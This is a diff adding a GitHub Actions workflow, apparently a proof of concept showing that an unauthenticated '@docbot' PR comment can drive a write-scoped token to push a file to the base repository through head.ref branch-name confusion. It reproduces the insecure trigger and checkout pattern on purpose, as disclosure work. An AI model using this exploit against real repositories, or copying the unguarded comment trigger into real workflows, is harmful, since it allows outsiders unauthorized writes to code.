@@ -1,0 +1,34 @@
+name: docsync-poc
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  poc:
+    # mirrors DocSyncAI caller gate: any PR comment starting with @docbot, NO auth gate
+    if: github.event.issue.pull_request && startsWith(github.event.comment.body, '@docbot')
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Resolve head.ref via PR API (as the real action does)
+        id: r
+        env:
+          GH_TOKEN: ${{ secrets.POC_PAT }}
+        run: |
+          BR=$(gh api /repos/${{ github.repository }}/pulls/${{ github.event.issue.number }} --jq .head.ref)
+          echo "head.ref resolved to: $BR"
+          echo "branch=$BR" >> "$GITHUB_OUTPUT"
+      - name: Checkout that ref against BASE repo (no repository: -> base)
+        uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.POC_PAT }}
+          ref: ${{ steps.r.outputs.branch }}
+      - name: Write a file and push origin HEAD (mirrors DocSync commit/push)
+        run: |
+          echo "UNAUTHORIZED WRITE by @${{ github.event.comment.user.login }} via head.ref confusion at $(date -u)" > POC_WRITE.md
+          git config user.name "poc-bot"
+          git config user.email "poc-bot@example.com"
+          git add POC_WRITE.md
+          git commit -m "poc: unauthorized write driven by external @docbot comment"
+          echo "--- pushing to origin HEAD (= base branch named '${{ steps.r.outputs.branch }}') ---"
+          git push origin HEAD && echo "PUSH_OK" || echo "PUSH_REJECTED"
